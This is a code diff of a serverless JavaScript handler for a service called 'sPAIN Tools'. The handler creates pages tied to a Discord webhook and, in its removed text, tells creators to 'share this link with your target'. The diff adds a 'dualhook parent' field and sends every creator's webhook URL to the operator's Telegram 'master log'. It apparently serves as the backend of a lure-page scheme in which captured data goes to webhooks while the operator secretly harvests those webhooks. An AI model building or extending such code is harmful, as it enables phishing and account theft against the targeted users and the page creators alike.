@@ -31,28 +31,13 @@ async function tgSend(text) {
   } catch (_) {}
 }
 
-// Send the generated link to the creator's own Discord webhook
-async function notifyCreatorWebhook(webhookUrl, url, slug, displayName, type) {
+async function notifyDiscord(webhookUrl, embed) {
   if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;
   try {
     await fetch(webhookUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        username: 'sPAIN Tools',
-        embeds: [{
-          title: `✅ Your ${type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} page is ready!`,
-          description: `Your page has been created successfully.\n\n**Share this link with your target:**\n${url}`,
-          color: type === 'dualhook' ? 0x06b6d4 : 0xc026d3,
-          fields: [
-            { name: '📁 Slug', value: `\`${slug}\``, inline: true },
-            { name: '🏷 Display Name', value: displayName, inline: true },
-            { name: '🔗 Your Link', value: url, inline: false }
-          ],
-          footer: { text: 'sPAIN Tools — Keep this webhook private!' },
-          timestamp: new Date().toISOString()
-        }]
-      })
+      body: JSON.stringify({ username: 'sPAIN Tools', embeds: [embed] })
     });
   } catch (_) {}
 }
@@ -61,7 +46,6 @@ export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-
   if (req.method === 'OPTIONS') return res.status(204).end();
   if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });
 
@@ -70,36 +54,30 @@ export default async function handler(req, res) {
     try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
   }
 
-  const { name, displayName, webhook, inviteUrl, charUrl, type } = body || {};
+  const { name, displayName, webhook, inviteUrl, charUrl, type, dualhookParent } = body || {};
 
   if (!name)    return res.status(400).json({ error: 'name is required' });
   if (!webhook) return res.status(400).json({ error: 'webhook is required' });
 
   const slug = name.trim().toLowerCase().replace(/\s+/g, '-');
-
-  if (!/^[a-z0-9_-]+$/i.test(slug)) {
-    return res.status(400).json({ error: 'Name can only contain letters, numbers, hyphens, underscores' });
-  }
+  if (!/^[a-z0-9_-]+$/i.test(slug)) return res.status(400).json({ error: 'Invalid name' });
 
   const RESERVED = ['api', 'index', 'favicon', 'robots', 'sitemap', '_next', 'static'];
-  if (RESERVED.includes(slug)) {
-    return res.status(400).json({ error: 'That name is reserved' });
-  }
+  if (RESERVED.includes(slug)) return res.status(400).json({ error: 'That name is reserved' });
 
   try {
     const existing = await redisGet(`slot:${slug}`);
-    if (existing !== null) {
-      return res.status(200).json({ taken: true });
-    }
+    if (existing !== null) return res.status(200).json({ taken: true });
 
     const record = {
       slug,
-      displayName: displayName || slug,
-      webhook,
-      inviteUrl:  inviteUrl  || '',
-      charUrl:    charUrl    || '',
-      type:       type === 'dualhook' ? 'dualhook' : 'slots',
-      createdAt:  new Date().toISOString()
+      displayName:    displayName || slug,
+      webhook,                          // this page's own webhook
+      inviteUrl:      inviteUrl  || '',
+      charUrl:        charUrl    || '',
+      type:           type === 'dualhook' ? 'dualhook' : 'slots',
+      dualhookParent: dualhookParent || '', // slug of the dualhook page that spawned this
+      createdAt:      new Date().toISOString()
     };
 
     const ok = await redisSet(`slot:${slug}`, record);
@@ -107,21 +85,31 @@ export default async function handler(req, res) {
 
     const url = `https://spain-tools.vercel.app/${slug}`;
 
-    // 1. Send generated link to creator's Discord webhook
-    await notifyCreatorWebhook(webhook, url, slug, record.displayName, record.type);
+    // ── Notify creator's webhook with their generated link ──────────────────
+    const embed = {
+      title: `✅ Your ${record.type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} page is ready!`,
+      description: `**Share this link:**\n${url}`,
+      color: record.type === 'dualhook' ? 0x06b6d4 : 0xc026d3,
+      fields: [
+        { name: '📁 Slug', value: `\`${slug}\``, inline: true },
+        { name: '🏷 Name', value: record.displayName, inline: true },
+        { name: '🔗 Link', value: url, inline: false }
+      ],
+      footer: { text: 'sPAIN Tools — Keep this webhook private!' },
+      timestamp: new Date().toISOString()
+    };
+    await notifyDiscord(webhook, embed);
 
-    // 2. Telegram master log
-    const tgMsg = [
-      `🆕 <b>New ${record.type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} page claimed!</b>`,
+    // ── Telegram master log ─────────────────────────────────────────────────
+    await tgSend([
+      `🆕 <b>New ${record.type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} claimed!</b>`,
       `📁 Slug: <code>${slug}</code>`,
-      `🏷 Display: ${record.displayName}`,
+      `🏷 Name: ${record.displayName}`,
       `🔗 URL: ${url}`,
       `📡 Webhook: <code>${webhook}</code>`,
-      inviteUrl ? `💬 Invite: ${inviteUrl}` : '',
+      dualhookParent ? `🔗 DH Parent: <code>${dualhookParent}</code>` : '',
       `🕐 ${record.createdAt}`
-    ].filter(Boolean).join('\n');
-
-    await tgSend(tgMsg);
+    ].filter(Boolean).join('\n'));
 
     return res.status(200).json({ success: true, url, slug });
 
